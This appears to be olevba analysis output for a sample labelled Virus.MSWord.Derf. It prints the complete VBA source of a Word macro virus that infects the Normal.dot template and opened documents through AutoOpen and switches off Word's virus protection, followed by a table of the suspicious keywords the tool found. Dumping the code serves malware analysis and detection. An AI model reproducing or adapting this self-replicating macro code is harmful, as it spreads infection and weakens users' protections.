olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Derf-81da776a173580c1a9997eaf5c463d9f520fb63b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Derf-81da776a173580c1a9997eaf5c463d9f520fb63b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Derf-81da776a173580c1a9997eaf5c463d9f520fb63b - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim DocFileName

'Please don't delete me.

Sub AutoOpen()

    DocFileName = Windows(1).Document.FullName
    
    Open "C:\DERF" For Random As #1
    Get #1, , Text
    Close #1
    
    If Text <> "Derf" Then
    
        Application.OrganizerCopy Source:=DocFileName, Destination:= _
        "C:\Program Files\Microsoft Office\Templates\Normal.dot", Name:="Module1" _
        , Object:=wdOrganizerObjectProjectItems
        Selection.TypeParagraph
    
        Text = "Derf"
        Open "C:\DERF" For Random As #1
        Put #1, , Text
        Close #1
    
    End If
    
    
    On Error GoTo Finish:
    
Other:
    
    Application.OrganizerCopy Source:= _
        "C:\Program Files\Microsoft Office\Templates\Normal.dot", Destination:= _
        DocFileName, Name:="Module1", Object:= _
    wdOrganizerObjectProjectItems
    
Finish:

With Options
    .VirusProtection = False
End With

Randomize (Timer)
If Int(Rnd() * 10) = 5 And WeekDay(Date) = 1 Then
    Fred
End If

End Sub

Sub Fred()

    Ans = InputBox("Hello. My name is Derf. Give me a biscuit.", "Derf")

    If Ans = "biscuit" Or Ans = "a biscuit" Then
        AnsYN = MsgBox("Mmm. Thankyou. Would you like to delete me now?.", vbYesNo, "Derf")
        If AnsYN = Yes Then
            Selection.TypeText Text:="1234567890Derf: Derf is now dead."
            Application.OrganizerDelete Source:= _
            "C:\Program Files\Microsoft Office\Templates\Normal.dot", Name:="Module1" _
            , Object:=wdOrganizerObjectProjectItems
            Application.OrganizerDelete Source:= _
            DocFileName, Name:="Module1" _
            , Object:=wdOrganizerObjectProjectItems
        End If
        If AnsYN = No Then
            GoTo Finish2:
        End If
    Else
        a = MsgBox("OK Then, Bye. I'll be back.", vbOKOnly, "Derf")
    End If
    
    Selection.TypeText Text:="1234567890Derf"

Finish2:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

